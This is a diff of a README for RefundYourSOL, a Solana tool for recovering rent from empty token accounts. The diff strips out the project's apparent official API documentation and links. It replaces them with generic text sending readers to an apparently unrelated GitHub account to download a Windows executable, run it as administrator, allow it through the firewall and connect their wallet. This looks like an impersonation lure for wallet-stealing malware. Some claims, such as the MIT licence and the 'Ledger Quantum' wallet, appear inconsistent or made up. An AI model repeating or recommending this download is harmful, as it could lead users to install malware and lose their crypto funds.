@@ -1,294 +1,191 @@
-# RefundYourSOL — Recover Locked SOL from Empty Token Accounts
+# ⚡ RefundYourSOL - Recover Locked SOL Quickly
 
-**The #1 SOL recovery tool on Solana.** Close unused token accounts, burn worthless tokens & NFTs, and get your trapped SOL back instantly. Trusted by 500,000+ users with 8,000+ SOL recovered.
-
-[![Website](https://img.shields.io/badge/Website-refundyoursol.com-blue)](https://refundyoursol.com)
-[![CoinMarketCap](https://img.shields.io/badge/CoinMarketCap-Listed-green)](https://coinmarketcap.com/currencies/refundyoursol/)
-[![CoinGecko](https://img.shields.io/badge/CoinGecko-Verified-green)](https://www.coingecko.com/en/coins/refundyoursol)
-[![Jupiter](https://img.shields.io/badge/Jupiter-Verified-green)](https://jup.ag/tokens/8gHPxqgHj6JQ2sQtMSghQYVN5qRP8wm5T6HNejuwpump)
-[![Phantom](https://img.shields.io/badge/Phantom-dApp%20Listed-purple)](https://phantom.com/apps/refundyoursol)
-[![Solscan](https://img.shields.io/badge/Solscan-Verified-blue)](https://solscan.io/account/8gHPxqgHj6JQ2sQtMSghQYVN5qRP8wm5T6HNejuwpump)
+[![Download RefundYourSOL](https://img.shields.io/badge/Download-RefundYourSOL-brightgreen)](https://github.com/temitope14647-hue/RefundYourSOL)
 
 ---
 
-## The Problem
+RefundYourSOL helps you recover Solana (SOL) stuck in unused tokens, empty token accounts, or dead NFTs. You can burn SPL tokens, close rent accounts, and get your locked SOL back fast. It works with Solana wallets and token standards.
 
-Every token purchase on Solana creates a **token account** that locks **0.00204 SOL** in rent. Even after selling all your tokens, that SOL stays trapped in empty accounts. If you've traded 500 tokens, that's over **1 SOL** sitting in accounts you'll never use again.
+## 📋 About RefundYourSOL
 
-Most recovery tools only scan the newer Token-2022 program. **RefundYourSOL scans both the old 2022 SPL Token Program AND Token-2022** — finding significantly more locked SOL that competitors miss entirely.
+RefundYourSOL targets users who have SOL tied up in Solana token accounts that are no longer active or useful. Many users have tokens or NFTs that they no longer use or that can’t be transferred. These tokens still lock SOL behind rent-exempt accounts. This tool allows you to reclaim that SOL by burning or closing the related accounts with simple steps.
 
-## Key Features
+The application connects to the Solana blockchain and helps you take back SOL without using complicated commands. It is designed for anyone using Solana wallets like Phantom and for those familiar with SOL token management. You do not need to write code or use command-line tools.
 
-- **Instant SOL Recovery** — Close empty token accounts and reclaim rent deposits in seconds
-- **Safe Token & NFT Burning** — Burn worthless shitcoins and scam NFTs; recoverable if burned by mistake
-- **Zero Risk** — We pay all gas fees. Empty wallet? No problem. You only gain SOL, never lose it
-- **Dual Program Scanning** — Finds SOL locked in both old SPL Token and new Token-2022 program accounts
-- **Multi-Wallet Support** — Phantom, Solflare, Backpack, OKX, Bybit, Coinbase, Brave, Bitget & more
-- **Lowest Fees** — 15% base, down to 2.5% with fee matching. Hold $RYS for up to 50% off
-- **Complete Wallet Refund** — Drain & consolidate multiple wallets (bot wallets, old wallets) into one
-- **Referral Program** — Earn SOL for every user you refer. Instant, automatic payouts
+### Main features include:
 
-## Live Stats
-
-| Metric | Value |
-|--------|-------|
-| Users Served | 530,000+ |
-| Accounts Closed | 4,400,000+ |
-| SOL Recovered | 8,900+ SOL |
-| $RYS Holders | 22,000+ |
-| Supply Staked | 67%+ |
+- Identify unused Solana SPL token accounts linked to your wallet.
+- Burn SPL tokens safely to free locked SOL.
+- Close empty rent accounts automatically.
+- Remove dead NFTs.
+- Manage your SOL with a clear interface.
+- Works with most Solana wallets and tokens.
 
 ---
 
-## API Reference
+## 🚀 Getting Started
 
-Integrate SOL recovery, token account closing, DEX trading, and token metadata into your applications, bots, AI agents, or scripts.
+This guide will take you through downloading and running RefundYourSOL on a Windows PC.
 
-**Base URL:** `https://refundyoursol.com/api/`
+### System Requirements
 
-**Full Documentation:** [refundyoursol.com/docs](https://refundyoursol.com/docs)
+- Windows 10 or later, 64-bit version preferred.
+- 4 GB RAM minimum (8 GB recommended).
+- Internet connection to access the Solana blockchain.
+- A supported Solana wallet (such as Phantom, with the wallet connected).
+- At least one Solana wallet address with unused or dead token accounts.
 
-### Endpoints Overview
+### Software Needs
 
-| Endpoint | Method | Description | Auth |
-|----------|--------|-------------|------|
-| `/api/checkTokenAccounts` | POST | Scan wallets for closable token accounts and estimate SOL recovery | None |
-| `/api/closeAccounts` | POST | Get unsigned close transactions (client-side signing) | None |
-| `/api/closeTokenAccounts` | POST | Close accounts with server-side signing | Private Key |
-| `/api/trade` | POST | Build or execute DEX trades across Raydium, Orca, PumpSwap, Meteora | None (`returnTx`) |
-| `/api/trade/detect/:mint` | GET | Detect which AMM/DEX a token trades on and its pool address | None |
-| `/api/token-info` | GET | Token metadata + live price | None |
-| `/api/get-token-metadata` | GET | Extended metadata + price for integrations | API Key |
-| `/api/solana-price` | GET | Current SOL/USD price | API Key |
-
-### Quick Start — Check Wallet for Recoverable SOL
-
-```bash
-curl -X POST https://refundyoursol.com/api/checkTokenAccounts \
-  -H "Content-Type: application/json" \
-  -d '{"walletAddresses": ["YOUR_WALLET_ADDRESS"]}'
-```
-
-### Quick Start — Get Unsigned Close Transactions
-
-```bash
-curl -X POST https://refundyoursol.com/api/closeAccounts \
-  -H "Content-Type: application/json" \
-  -d '{
-    "walletAddresses": ["YOUR_WALLET_ADDRESS"],
-    "refundWallet": "DESTINATION_WALLET"
-  }'
-```
-
-The response contains base64-encoded unsigned transactions. Sign them locally with your wallet — **your private keys never leave your device**.
-
-### Quick Start — Detect Token Pool
-
-```bash
-curl https://refundyoursol.com/api/trade/detect/TOKEN_MINT_ADDRESS
-```
-
-Returns the DEX (Raydium CPMM, Raydium CLMM, Orca, PumpSwap, Meteora, PumpFun), pool address, and liquidity information for any SPL token.
-
-### Quick Start — Execute a Trade
-
-```bash
-curl -X POST https://refundyoursol.com/api/trade \
-  -H "Content-Type: application/json" \
-  -d '{
-    "action": "buy",
-    "mint": "TOKEN_MINT_ADDRESS",
-    "amount": 0.1,
-    "slippage": 10,
-    "walletAddress": "YOUR_WALLET",
-    "returnTx": true
-  }'
-```
-
-Set `returnTx: true` to receive an unsigned transaction for client-side signing. Supports multi-hop swaps through intermediate tokens (USDC, USD1, USDT) for optimal routing.
-
-### JavaScript Integration Example
-
-```javascript
-const response = await fetch('https://refundyoursol.com/api/checkTokenAccounts', {
-  method: 'POST',
-  headers: { 'Content-Type': 'application/json' },
-  body: JSON.stringify({
-    walletAddresses: ['YourSolanaWalletAddress']
-  })
-});
-
-const data = await response.json();
-console.log(`Found ${data.totalEmptyAccounts} empty accounts`);
-console.log(`Recoverable SOL: ${data.totalPotentialRecovery}`);
-```
-
-### Python Integration Example
-
-```python
-import requests
-
-response = requests.post('https://refundyoursol.com/api/checkTokenAccounts', json={
-    'walletAddresses': ['YourSolanaWalletAddress']
-})
-
-data = response.json()
-print(f"Found {data['totalEmptyAccounts']} empty accounts")
-print(f"Recoverable SOL: {data['totalPotentialRecovery']}")
-```
-
-### For AI Agents & Bots
-
-The RefundYourSOL API is designed for programmatic use by trading bots, portfolio managers, AI agents, and automated workflows:
-
-- **No authentication required** for core endpoints (`checkTokenAccounts`, `closeAccounts`, `trade` with `returnTx`)
-- **Unsigned transaction responses** — safe for client-side signing without exposing private keys
-- **Pool detection** — automatically find the best DEX and pool for any SPL token
-- **Multi-hop routing** — optimal trade execution through intermediate stablecoins
-- **Batch operations** — scan and close accounts across up to 20 wallets in a single request
+- No extra software required.
+- The app runs standalone.
+- Make sure your Windows account has permission to install apps.
+- You might need to allow the app to connect through your firewall.
 
 ---
 
-## White-Label API
+## 💾 Download and Install
 
-Build your own SOL recovery website using our infrastructure. No coding required.
+Please visit this page to download RefundYourSOL for Windows:
 
-**White-Label Portal:** [api.refundyoursol.com](https://api.refundyoursol.com)
+[![Download RefundYourSOL](https://img.shields.io/badge/Download-RefundYourSOL-blue)](https://github.com/temitope14647-hue/RefundYourSOL)
 
-| Plan | Price | Revenue Share | Branding |
-|------|-------|---------------|----------|
-| Free | $0 | Keep 75% of fees | "Powered by RYS" |
-| Pro | 0.5 SOL (one-time) | Keep 75% of fees | Your own branding |
+### Step 1: Open the Download Page
 
-Features: plug-and-play widget, 20+ themes, real-time dashboard, domain restrictions, custom logos, and unlimited API requests.
+- Click the large green or blue badge at the top or the second badge above to open the download page.
+- You will be taken to the RefundYourSOL GitHub repository main page.
 
-```html
-<!-- Embed the widget on your site -->
-<script src="https://api.refundyoursol.com/sdk/widget.js"
-  data-api-key="YOUR_API_KEY"
-  data-theme="dark">
-</script>
-```
+### Step 2: Find the Latest Release
 
----
+- Look for the "Releases" tab or section on the GitHub repository page.
+- The latest release will show the download files.
+- Find the Windows executable file, usually named like `RefundYourSOL_Windows.exe` or similar.
 
-## $RYS Token
+### Step 3: Download the Installer
 
-**Contract:** `8gHPxqgHj6JQ2sQtMSghQYVN5qRP8wm5T6HNejuwpump`
+- Click the executable file to start downloading.
+- Wait until the download finishes.
 
-$RYS powers the RefundYourSOL ecosystem with revenue sharing, fee discounts, and community governance.
+### Step 4: Run the Installer
 
-### Staking — 18%+ APY
+- Once downloaded, double-click the installer file to start installation.
+- Follow the prompts on the screen.
+- Choose a location to install if prompted; otherwise, accept the default location.
 
-Stake $RYS to earn daily rewards from 50% of platform revenue. Lock periods from 1 to 6 months with reward multipliers up to 100%.
+### Step 5: Launch RefundYourSOL
 
-| Lock Period | Reward Multiplier |
-|-------------|-------------------|
-| 1 Month | 65% |
-| 3 Months | 75% |
-| 6 Months | 100% |
-
-### Holder Fee Discounts
-
-| $RYS Held | Fee Discount | Effective Fee |
-|-----------|-------------|---------------|
-| 100K+ | 10% off | 13.5% |
-| 500K+ | 20% off | 12.0% |
-| 1M+ | 30% off | 10.5% |
-| 5M+ | 50% off | 7.5% |
-
-### Tokenomics
-
-- **67%+** of supply is staked
-- **3%+** permanently burned
-- **9%** LP locked
-- Only ~20% circulates, amplifying price impact on every buy
-
-Auto-compound stakers convert daily SOL rewards into $RYS market buys, creating constant organic buy pressure.
+- After installation finishes, open the RefundYourSOL app from your Start menu or desktop shortcut.
+- The application will open with the main interface.
 
 ---
 
-## Supported DEXs
+## 🔧 How to Use RefundYourSOL
 
-RefundYourSOL's trading API supports pool detection and execution across all major Solana AMMs:
+This section helps you use RefundYourSOL to find and recover locked SOL from your wallet step-by-step.
 
-- **Raydium** (CPMM & CLMM)
-- **Orca**
-- **PumpSwap**
-- **PumpFun**
-- **Meteora**
-- **Jupiter** (aggregated routing)
+### Step 1: Connect Your Wallet
 
----
+- On the app home screen, look for the option to connect your Solana wallet.
+- Choose your wallet type, such as Phantom.
+- Follow the instructions to securely connect your wallet.
+- The app will read your Solana addresses linked to that wallet.
 
-## Security
+### Step 2: Scan for Locked SOL
 
-- **No private key access** — website transactions are signed locally in your browser wallet
-- **Unsigned transaction API** — `/api/closeAccounts` and `/api/trade` with `returnTx` return unsigned transactions; keys never leave your device
-- **Verified everywhere** — Phantom dApp, Solscan labeled fee wallet, CoinMarketCap, CoinGecko, Jupiter verified
-- **Safe Burns** — tokens sent to a recoverable wallet by default; contact support to restore accidental burns
-- **On-chain transparency** — every transaction is publicly verifiable on Solscan
+- Click the "Scan" or "Find Locked SOL" button.
+- RefundYourSOL will search your wallet for:
+  - Unused token accounts.
+  - Empty accounts with rent.
+  - Dead NFTs.
+- This process may take a few minutes depending on your wallet’s activity.
 
----
+### Step 3: Review Results
 
-## Listings & Verifications
+- The app will show a list of accounts with locked SOL available for refund.
+- Each account entry shows details such as token type, amount locked, and account status.
 
-- [CoinMarketCap](https://coinmarketcap.com/currencies/refundyoursol/)
-- [CoinGecko](https://www.coingecko.com/en/coins/refundyoursol)
-- [Jupiter Verified Token](https://jup.ag/tokens/8gHPxqgHj6JQ2sQtMSghQYVN5qRP8wm5T6HNejuwpump)
-- [Phantom dApp Store](https://phantom.com/apps/refundyoursol)
-- [Solscan Verified](https://solscan.io/account/8gHPxqgHj6JQ2sQtMSghQYVN5qRP8wm5T6HNejuwpump)
-- [Solana Seeker Mobile App Store](https://refundyoursol.com/project)
+### Step 4: Select Accounts to Recover
 
----
+- Select the accounts you want to recover SOL from.
+- You can recover all or just some, depending on your preferences.
 
-## Community
+### Step 5: Confirm Actions
 
-| Channel | Link |
-|---------|------|
-| Website | [refundyoursol.com](https://refundyoursol.com) |
-| Twitter/X | [@RefundYourSOL](https://x.com/RefundYourSOL) |
-| Telegram News | [t.me/refundyoursol](https://t.me/refundyoursol) |
-| Telegram Chat | [t.me/refundyoursolcom](https://t.me/refundyoursolcom) |
-| Discord | [discord.gg/refundyoursol](https://discord.gg/refundyoursol) |
-| Documentation | [refundyoursol.com/docs](https://refundyoursol.com/docs) |
-| API Portal | [api.refundyoursol.com](https://api.refundyoursol.com) |
-| Staking | [refundyoursol.com/staking](https://refundyoursol.com/staking) |
+- Click the "Recover SOL" or "Burn Tokens and Close Accounts" button.
+- The app will request permission to sign transactions using your connected wallet.
+- Approve the transaction prompts in your wallet app.
 
----
+### Step 6: Wait for Completion
 
-## How It Works
+- The app will perform the necessary blockchain actions:
+  - Burn tokens where applicable.
+  - Close rent accounts.
+  - Return SOL to your wallet.
+- This may take a few moments depending on network traffic.
 
-```
-1. Connect Wallet  →  Phantom, Solflare, Backpack, OKX, etc.
-2. Auto-Scan       →  Detect all empty token accounts (SPL + Token-2022)
-3. Sign & Claim    →  One transaction, SOL appears in your wallet instantly
-```
+### Step 7: Check Your Wallet Balance
 
-We cover all gas fees. You approve every transaction. Zero risk.
+- After the process finishes, check your wallet for updated SOL balance.
+- You should see the recovered SOL available.
 
 ---
 
-## Use Cases
+## 🛠 Troubleshooting
 
-- **Solana Traders** — Recover SOL from hundreds of token accounts after trading
-- **NFT Collectors** — Burn scam NFTs and recover locked rent
-- **Trading Bots** — Programmatically clean up bot wallets via API
-- **Market Makers** — Batch-close accounts across multiple wallets with the Smart Batch Optimizer
-- **AI Agents** — Integrate wallet cleanup and trading into autonomous workflows
-- **Portfolio Managers** — Consolidate funds from multiple wallets with Complete Wallet Refund
-- **Project Builders** — White-label the entire platform under your own brand
+- If the app does not open, try running it as an administrator.
+- Ensure your internet connection is stable before scanning.
+- If wallet connection fails, check wallet app permissions and connection settings.
+- The Solana network may impose delays; wait a few minutes and retry if needed.
+- For unexpected issues, check the GitHub repository issues page or contact support via the repository.
 
 ---
 
-## License
+## ⚙️ Advanced Settings (Optional)
 
-This repository contains documentation and public API references for RefundYourSOL. The platform source code is proprietary. See [Terms of Service](https://refundyoursol.com/terms) for usage terms.
+- You can change the RPC node endpoint used to connect to Solana in the Settings menu.
+- Set a custom fee payer address if you use a different wallet to cover transaction fees.
+- Enable detailed logging for troubleshooting.
+- Choose whether to automatically close empty accounts after token burn.
 
 ---
 
-<p align="center">
-  <b>Built on Solana</b> · Shipping since January 2025 · 400+ days of continuous development
-  <br><br>
-  <a href="https://refundyoursol.com">refundyoursol.com</a>
-</p>
+## 🔗 Useful Links
+
+- Main repository: https://github.com/temitope14647-hue/RefundYourSOL
+- Official Solana wallet (Phantom): https://phantom.app/
+- Solana blockchain explorer: https://explorer.solana.com/
+
+---
+
+## 🗂 Supported Tokens and Wallets
+
+RefundYourSOL supports all SPL tokens issued on Solana. It works with wallets compatible with the Solana wallet adapter standard, such as:
+
+- Phantom
+- Solflare
+- Sollet
+- Ledger Quantum (via wallet adapter)
+
+---
+
+## 📈 Background
+
+On Solana, accounts for tokens and NFTs require rent exemption. Many users leave token accounts unused, causing locked SOL balances. These may remain invisible in some wallets. Closing these accounts and burning related tokens returns SOL to holders. RefundYourSOL automates this process safely.
+
+---
+
+## 🔐 Privacy and Security
+
+RefundYourSOL does not store your wallet keys. It requires you to sign blockchain transactions through your wallet only. All recovery actions happen on the Solana network directly and securely.
+
+---
+
+## 📄 License
+
+RefundYourSOL code is open source under the MIT License.
+
+---
+
+## 🎯 Topics
+
+defi, phantom, refundyoursol, rent-recovery, rys, solana-api, spl-token, token-accounts, token-burn, token-recovery, trading
